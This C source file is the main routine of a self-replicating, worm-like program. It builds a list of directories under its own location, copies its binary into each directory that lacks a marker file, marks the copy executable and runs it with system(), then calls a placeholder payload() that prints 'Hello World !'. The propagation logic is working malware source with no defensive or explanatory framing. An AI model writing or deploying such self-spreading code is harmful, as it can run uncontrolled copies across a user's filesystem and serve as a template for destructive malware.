#include "../include/main.h"

void payload() {
	printf("Hello World !\n");
}

int main (int argc, char **argv) {
	Directory *list = NULL;
	Directory *iterator = NULL;
	char *root_directory = NULL;
	char *filename = NULL;
	char *dest_file = NULL;

	// init variables
	filename = basename(argv[0]);
	root_directory = dirname(argv[0]);
	
	// listing directories	
	list = (Directory *) malloc(sizeof(Directory));
	list->next = NULL;
	list->directory = NULL;
	buildList(list, root_directory);

	// for each directory, copy the program if no marker file found and execute it
	iterator = list;
	while (iterator != NULL && iterator->directory != NULL) {
		if (markerExists(iterator->directory) == -1) {

			// get destination file path
			dest_file = (char *) malloc(strlen(iterator->directory) + strlen(filename) + 2);
			strcpy(dest_file, iterator->directory);
			strcat(dest_file, "/");
			strcat(dest_file, filename);

			// copy the program in the destination directory, edit permissions and execute the new program	
			copy(filename, dest_file);
			setExecutable(dest_file);
			chdir(iterator->directory);
			system(dest_file);
			chdir("..");

			payload();

			// free dynamic allocations
			free(dest_file);
		}
		iterator = iterator->next;
	}

	// free dynamic allocations
	freeList(list);
	
	return 0;
}
